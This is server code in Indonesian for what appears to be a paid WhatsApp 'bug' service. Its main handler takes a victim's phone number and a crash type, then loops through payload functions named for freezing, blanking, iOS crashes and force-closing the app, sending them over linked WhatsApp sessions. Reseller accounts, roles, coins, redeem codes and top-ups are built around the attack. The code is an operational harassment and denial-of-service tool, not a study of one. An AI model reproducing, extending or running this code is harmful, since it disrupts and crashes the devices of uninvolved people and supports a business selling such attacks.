  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    owner: 0,
    mods: 10,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (vinzzoffc, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
     switch (bug) {
        case "freez":
            for (let i = 0; i < 180; i++) {
                  await freez(vinzzoffc, targetJid);
                  await XStromFlowFreeze(vinzzoffc, targetJid);
                  await sleep(2500);
                  await FloodUIxFC(vinzzoffc, targetJid);
            }
          break;
        case "bulldo":
            for (let i = 0; i < 100; i++) {
                  await DelayHard(vinzzoffc, targetJid);
                  await bulldzoerX(vinzzoffc, targetJid);
                  await DelayBulldoV2(vinzzoffc, targetJid);
                  await LoocDepong(vinzzoffc, targetJid);
            }
          break;
        case "invisible":
            for (let i = 0; i < 80; i++) {
                  await DelayHard(vinzzoffc, targetJid);
                  await XStromDelayInvisible(vinzzoffc, targetJid, true);
                  await BlackHole02(vinzzoffc, targetJid);
                  await Delayyyx(vinzzoffc, targetJid);
                  await XStromDelayBeta(vinzzoffc, targetJid);
                  await delaycrash(vinzzoffc, targetJid);
                  await paymentDelay(vinzzoffc, targetJid);
                  await DelaySdot(vinzzoffc, targetJid);
                  await XStromDelayNative(vinzzoffc, targetJid, true);
            }
          break;
        case "ioscrash":
            for (let i = 0; i < 150; i++) {
                   await MonikaCrashinvis(vinzzoffc, targetJid);
                   await MonikaCrashinvis(vinzzoffc, targetJid);
                   await MonikaCrashinvis(vinzzoffc, targetJid);
                   await sleep(2500);
                   await FloodUIxFC(vinzzoffc, targetJid);
            }
          break;
        case "blank":
            for (let i = 0; i < 100; i++) {
                  await BlankScreen(vinzzoffc, targetJid);
                  await MonikaCrashinvis(vinzzoffc, targetJid);
                  await XxUiCrash(vinzzoffc, targetJid);
                  await XStromFlowFreeze(vinzzoffc, targetJid);
                  await QQSPrivateBlank(vinzzoffc, targetJid);
                  await UiSystem(vinzzoffc, targetJid);
                  await FloodUIxFC(vinzzoffo, targetJid);
                  await XProtexBlankChatV5(vinzzoffc, targetJid);
                  await uiKiller(vinzzoffc, targetJid);
                  await crashUi(vinzzoffc, targetJid);
            }
          break;
        case "forclose":
            for (let i = 0; i < 100; i++) {
                  await FloodUIxFC(vinzzoffc, targetJid);
                  await MisteryHow(vinzzoffc, target);
                  await MisteryHow2(vinzzoffc, target);
                  await MisteryHow3(vinzzoffc, target);
                  await JessiForceLst(vinzzoffc, targetJid);
            }
          break;
      }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        const sessionName = user.username;
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    const vinzzoffc = await checkActiveSessionInFolder(user.username);
    if (!vinzzoffc) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(vinzzoffc);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('xs-sessi', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    
    // Cek apakah session ini aktif
    const isActive = activeConnections[sessionName] ? true : false;
    
    activeCreds.push({
      sessionName: sessionName,
      isActive: isActive,
      type: biz[sessionName] ? "Business" : mess[sessionName] ? "Messenger" : "Unknown"
    });
  }

  return activeCreds;
}

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('xs-sessi', user.username, number); 

  if (!fs.existsSync(`xs-sessi/${user.username}`)) fs.mkdirSync(`xs-sessi/${user.username}`, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const vinzzoffc = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  vinzzoffc.ev.on("creds.update", saveCreds);

  vinzzoffc.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!vinzzoffc.authState.creds.registered) {
    await waiting(1000);
    let code = await vinzzoffc.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  } else {
    return res.json({ valid: false, message: "Already registered" });
  }
  } catch (err) {
    console.error("Error in getPairing:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner",].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});
// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    console.log("[❌ USERADD] Creator tidak ditemukan.");
    return res.json({ valid: true, authorized: false, message: "Unauthorized." });
  }

  const targetRole = (role || "member").toLowerCase();

  // ===== RULE ROLE CREATE =====
  if (creator.role === "mods") {
    if (targetRole !== "member" && targetRole !== "reseller") {
      console.log("[❌ USERADD] Mods tidak boleh membuat role ini.");
      return res.json({
        valid: true,
        authorized: false,
        message: "Mods hanya bisa membuat member atau reseller."
      });
    }
  }

  if (creator.role !== "owner" && creator.role !== "mods") {
    console.log("[❌ USERADD] Role tidak diizinkan.");
    return res.json({
      valid: true,
      authorized: false,
      message: "Role ini tidak memiliki izin membuat user."
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({
      valid: true,
      created: false,
      message: "Username already exists."
    });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    parent: creator.username
  };

  db.push(newUser);
  saveDatabase(db);

  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({
    valid: true,
    authorized: true,
    created: true,
    user: newUser
  });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner",].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa menambah masa aktif maksimal 30 hari." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== ENDPOINT KHUSUS UNTUK REFRESH COINS =====
app.get("/refreshCoins", (req, res) => {
  const { key } = req.query;
  
  console.log("\n=== 💰 REFRESH COINS REQUEST ===");
  console.log("Key:", key);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("❌ Invalid key");
    return res.json({ valid: false, message: "Invalid key" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("❌ User not found");
    return res.json({ valid: false, message: "User not found" });
  }
  
  if (user.coins === undefined || user.coins === null) {
    user.coins = 100;
    saveDatabase(db);
  }
  
  console.log("✅ Coins untuk", user.username, ":", user.coins);
  console.log("================================\n");
  
  return res.json({
    valid: true,
    coins: user.coins,
    username: user.username,
    role: user.role || "member"
  });
});

// ===== ENDPOINT REDEEM CODE =====
app.get("/redeem", (req, res) => {
  const { key, code } = req.query;

  console.log(`[🎁 REDEEM] Request dari key: ${key}, code: ${code}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ REDEEM] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ REDEEM] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Load redeem codes
  const redeemCodes = loadRedeemCodes();
  const redeemData = redeemCodes.find(r => r.code === code.toUpperCase());

  if (!redeemData) {
    console.log("[❌ REDEEM] Invalid code");
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kode redeem tidak valid" 
    });
  }

  if (redeemData.used) {
    console.log("[❌ REDEEM] Code already used");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode sudah digunakan oleh ${redeemData.used_by} pada ${new Date(redeemData.used_at).toLocaleString("id-ID")}` 
    });
  }

  // Validasi role - hanya bisa redeem jika role sesuai atau lebih tinggi
  const roleHierarchy = {
    member: 1,
    reseller: 2,
    mods: 3,
    owner: 4,
  };

  const userRole = user.role || "member";
  const codeRole = redeemData.role;

  if (roleHierarchy[userRole] < roleHierarchy[codeRole]) {
    console.log("[❌ REDEEM] Role not allowed");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode ini hanya untuk role ${codeRole.toUpperCase()} atau lebih tinggi. Role kamu: ${userRole.toUpperCase()}` 
    });
  }

  // Redeem successful - add coins
  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += redeemData.amount;
  saveDatabase(db);

  // Mark code as used
  redeemData.used = true;
  redeemData.used_by = user.username;
  redeemData.used_at = new Date().toISOString();
  saveRedeemCodes(redeemCodes);

  console.log(`[✅ REDEEM] ${user.username} redeemed ${code} (+${redeemData.amount} coins)`);

  // Log to file
  const logLine = `${new Date().toISOString()} | REDEEM | ${user.username} redeemed ${code} (${codeRole}) for ${redeemData.amount} coins | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // Notify to Telegram group
  sendToGroups(`🎁 *Kode Redeem Digunakan*

🎟 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
👤 User: ${user.username}
💰 Nilai: ${redeemData.amount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    amount: redeemData.amount,
    message: "Redeem berhasil!",
    coins_before: oldCoins,
    coins_after: user.coins
  });
});

// ===== ENDPOINT GIFT COIN (FIXED) =====
app.post("/giftCoin", (req, res) => {
  const { key, fromUsername, toUsername, amount } = req.body;

  console.log(`[🎁 GIFT DEBUG]`);
  console.log(`Key: ${key}`);
  console.log(`From: ${fromUsername}`);
  console.log(`To: ${toUsername}`);
  console.log(`Amount: ${amount}`);

  // ✅ VALIDASI KEY
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GIFT] Invalid key");
    return res.json({ 
      valid: false, 
      message: "Invalid session key" 
    });
  }

  // ✅ VALIDASI USERNAME PENGIRIM
  if (keyInfo.username.toLowerCase() !== fromUsername.toLowerCase()) {
    console.log("[❌ GIFT] Username mismatch");
    return res.json({ 
      valid: false, 
      message: "Username tidak sesuai dengan session" 
    });
  }

  const db = loadDatabase();
  const fromUser = db.find(u => u.username.toLowerCase() === fromUsername.toLowerCase());
  
  if (!fromUser) {
    console.log("[❌ GIFT] Sender not found");
    return res.json({ 
      valid: false, 
      message: "User pengirim tidak ditemukan" 
    });
  }

  // ✅ VALIDASI AMOUNT
  const giftAmount = parseInt(amount);
  if (!giftAmount || giftAmount <= 0) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Jumlah coin tidak valid" 
    });
  }

  // ✅ CEK SALDO
  if (fromUser.coins === undefined) fromUser.coins = 0;
  
  if (fromUser.coins < giftAmount) {
    console.log(`[❌ GIFT] Insufficient coins: ${fromUser.coins} < ${giftAmount}`);
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Coin tidak cukup! Saldo: ${fromUser.coins}, dibutuhkan: ${giftAmount}` 
    });
  }

  // ✅ CEK USER TUJUAN
  const toUser = db.find(u => u.username.toLowerCase() === toUsername.toLowerCase());
  
  if (!toUser) {
    console.log("[❌ GIFT] Recipient not found");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `User ${toUsername} tidak ditemukan` 
    });
  }

  // ✅ CEGAH KIRIM KE DIRI SENDIRI
  if (fromUsername.toLowerCase() === toUsername.toLowerCase()) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Tidak bisa mengirim gift ke diri sendiri" 
    });
  }

  // ✅ TRANSFER COINS
  if (toUser.coins === undefined) toUser.coins = 0;
  
  const fromOldCoins = fromUser.coins;
  const toOldCoins = toUser.coins;
  
  fromUser.coins -= giftAmount;
  toUser.coins += giftAmount;
  
  saveDatabase(db);

  console.log(`[✅ GIFT] ${fromUsername} sent ${giftAmount} coins to ${toUsername}`);

  // ✅ LOG TO FILE
  const logLine = `${new Date().toISOString()} | GIFT | ${fromUsername} → ${toUsername} | ${giftAmount} coins | ${fromUsername}: ${fromOldCoins} → ${fromUser.coins} | ${toUsername}: ${toOldCoins} → ${toUser.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // ✅ NOTIFY TO TELEGRAM
  sendToGroups(`🎁 *Gift Coin Terkirim*

📤 Dari: ${fromUsername}
📥 Ke: ${toUsername}
💰 Jumlah: ${giftAmount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}

Saldo ${fromUsername}: ${fromOldCoins} → ${fromUser.coins}
Saldo ${toUsername}: ${toOldCoins} → ${toUser.coins}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    message: "Gift berhasil dikirim!",
    from_coins_before: fromOldCoins,
    from_coins_after: fromUser.coins,
    to_coins_before: toOldCoins,
    to_coins_after: toUser.coins
  });
});

// ===== FINGERPRINT API ENDPOINTS =====

// Enable fingerprint
app.post("/api/fingerprint/enable", (req, res) => {
  const { username, password, deviceId } = req.body;

  console.log(`[👆 FINGERPRINT] Enable request for ${username}, device: ${deviceId}`);

  // Validasi key (opsional, bisa pakai session key juga)
  // Tapi untuk fingerprint, kita terima tanpa key karena ini dari device

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    return res.json({ 
      success: false, 
      message: "Invalid credentials" 
    });
  }

  // Load fingerprint devices
  const devices = loadFingerprintDevices();

  // Cek apakah device sudah terdaftar
  const existingIndex = devices.findIndex(d => 
    d.username === username && d.deviceId === deviceId
  );

  const deviceInfo = {
    username,
    deviceId,
    enabled: true,
    registeredAt: new Date().toISOString(),
    lastUsed: new Date().toISOString(),
    deviceName: req.body.deviceName || "Unknown Device"
  };

  if (existingIndex !== -1) {
    // Update existing
    devices[existingIndex] = { ...devices[existingIndex], ...deviceInfo };
  } else {
    // Add new
    devices.push(deviceInfo);
  }

  saveFingerprintDevices(devices);

  console.log(`✅ Fingerprint enabled for ${username} on device ${deviceId}`);

  // Kirim notifikasi ke Telegram (opsional)
  sendToGroups(
    `🔐 *Fingerprint Enabled*\n\n` +
    `👤 Username: ${username}\n` +
    `📱 Device: ${deviceInfo.deviceName}\n` +
    `🆔 Device ID: ${deviceId}\n` +
    `⏰ Waktu: ${new Date().toLocaleString("id-ID")}`,
    { parse_mode: "Markdown" }
  );

  return res.json({
    success: true,
    message: "Fingerprint enabled successfully"
  });
});

// ===== ENDPOINT REQUEST TOP UP DARI APLIKASI =====
app.post("/requestTopup", (req, res) => {
  const { key, amount } = req.body;

  console.log(`[💰 TOPUP REQUEST] Key: ${key}, Amount: ${amount}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ TOPUP] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ TOPUP] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Validasi amount
  if (!amount || amount < 25) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Minimal top up adalah 25 coin" 
    });
  }

  // Check if user has pending request
  const topupRequests = loadTopupRequests();
  const hasPending = topupRequests.find(r => r.username === user.username && r.status === "pending");

  if (hasPending) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kamu masih memiliki request top up yang pending. Tunggu hingga diproses." 
    });
  }

  // Create new request
  const requestId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const newRequest = {
    requestId,
    userId: null, // tidak ada telegram ID dari app
    username: user.username,
    amount: parseInt(amount),
    status: "pending",
    timestamp: new Date().toISOString(),
    source: "app" // penanda dari aplikasi
  };

  topupRequests.push(newRequest);
  saveTopupRequests(topupRequests);

  console.log(`[✅ TOPUP REQUEST] Created: ${requestId} for ${user.username}`);

  // KIRIM NOTIFIKASI KE OWNER ID SAJA (BUKAN KE GRUP)
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${requestId}` },
          { text: "❌ Reject", callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  return res.json({
    valid: true,
    success: true,
    requestId,
    message: "Request top up berhasil dibuat! Silakan tunggu konfirmasi dari admin.",
    amount: parseInt(amount)
  });
});

// ===== ENDPOINT CEK STATUS TOP UP REQUEST =====
app.get("/checkTopupStatus", (req, res) => {
  const { key, requestId } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.username === user.username);

  if (!request) {
    return res.json({ 
      valid: true, 
      found: false, 
      message: "Request tidak ditemukan" 
    });
  }

  return res.json({
    valid: true,
    found: true,
    requestId: request.requestId,
    amount: request.amount,
    status: request.status, // pending, approved, rejected
    timestamp: request.timestamp,
    processedAt: request.processedAt || null,
    processedBy: request.processedBy || null
  });
});

// ===== GROUP CHAT API ENDPOINTS =====

// GET /api/chat/messages - Ambil semua pesan chat
app.get("/api/chat/messages", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    // Ambil 100 pesan terakhir
    const messages = chatList
      .slice(-100)
      .map(m => ({
        id: m.id || `${m.from}-${m.to}-${m.time}`,
        from: m.from,
        to: m.to,
        message: m.message,
        timestamp: m.time,
        fromMe: m.from === user.username
      }));

    // Hitung user online (aktif dalam 5 menit terakhir)
    const now = Date.now();
    const activeUsers = new Set();
    chatList.forEach(msg => {
      const msgTime = new Date(msg.time).getTime();
      if (now - msgTime < 5 * 60 * 1000) {
        activeUsers.add(msg.from);
      }
    });

    res.json({
      success: true,
      messages: messages,
      online_users: activeUsers.size,
      your_username: user.username
    });
  } catch (err) {
    console.error("Error fetching messages:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch messages"
    });
  }
});

// POST /api/chat/send - Kirim pesan baru
app.post("/api/chat/send", (req, res) => {
  const { key, message } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  if (!message || message.trim().length === 0) {
    return res.json({ 
      success: false, 
      message: "Message cannot be empty" 
    });
  }

  if (message.length > 500) {
    return res.json({ 
      success: false, 
      message: "Message too long (max 500 characters)" 
    });
  }

  try {
    const newMessage = {
      id: `${user.username}-${Date.now()}`,
      from: user.username,
      to: "group", // untuk grup chat
      message: sanitize(message.trim()),
      time: new Date().toISOString()
    };

    chatList.push(newMessage);
    saveChat();

    // Kirim notifikasi ke semua user yang online via WebSocket
    Object.values(wsClients).forEach(client => {
      if (client.readyState === 1) { // WebSocket.OPEN
        client.send(JSON.stringify({
          type: 'newMessage',
          message: newMessage
        }));
      }
    });

    res.json({
      success: true,
      message: "Message sent successfully",
      data: newMessage
    });
  } catch (err) {
    console.error("Error sending message:", err);
    res.status(500).json({
      success: false,
      message: "Failed to send message"
    });
  }
});

// DELETE /api/chat/message/:id - Hapus pesan (hanya pesan sendiri)
app.delete("/api/chat/message/:id", (req, res) => {
  const { key } = req.query;
  const { id } = req.params;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const messageIndex = chatList.findIndex(m => 
      (m.id === id || `${m.from}-${m.to}-${m.time}` === id)
    );

    if (messageIndex === -1) {
      return res.json({ 
        success: false, 
        message: "Message not found" 
      });
    }

    const message = chatList[messageIndex];

    // Cek apakah user adalah pemilik pesan atau owner
    if ( message.from !== user.username && user.role !== "owner") {
      return res.json({ 
        success: false, 
        message: "You can only delete your own messages" 
      });
    }

    chatList.splice(messageIndex, 1);
    saveChat();

    // Broadcast deletion ke semua user online
    Object.values(wsClients).forEach(client => {
      if (client.readyState === 1) {
        client.send(JSON.stringify({
          type: 'messageDeleted',
          messageId: id
        }));
      }
    });

    res.json({
      success: true,
      message: "Message deleted successfully"
    });
  } catch (err) {
    console.error("Error deleting message:", err);
    res.status(500).json({
      success: false,
      message: "Failed to delete message"
    });
  }
});

// GET /api/chat/users - Ambil daftar user yang pernah chat
app.get("/api/chat/users", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    // Ambil semua username unik yang pernah chat
    const usernamesSet = new Set();
    chatList.forEach(msg => {
      usernamesSet.add(msg.from);
    });

    const usernames = Array.from(usernamesSet)
      .filter(u => u !== user.username) // exclude diri sendiri
      .map(username => {
        const userData = db.find(u => u.username === username);
        return {
          username,
